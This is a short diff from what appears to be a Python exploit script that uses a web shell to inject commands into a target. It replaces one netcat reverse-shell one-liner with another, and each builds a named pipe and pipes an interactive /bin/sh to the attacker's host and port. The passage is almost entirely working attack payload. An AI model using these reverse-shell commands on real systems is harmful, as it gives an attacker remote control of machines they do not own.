@@ -79,5 +79,5 @@ time_display = now.strftime("%d/%m/%Y %H:%M:%S")
 # open the shell
 print(f'\n[+] Web shell opened at {time_display}\n[+] Trying to open the reverse shell on {lhost}:{lport}...')
 
-inject(f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f') 
+inject(f'mkfifo /tmp/expktuy; nc {lhost} {lport} 0</tmp/expktuy | /bin/sh >/tmp/expktuy 2>&1; rm /tmp/expktuy') 
 
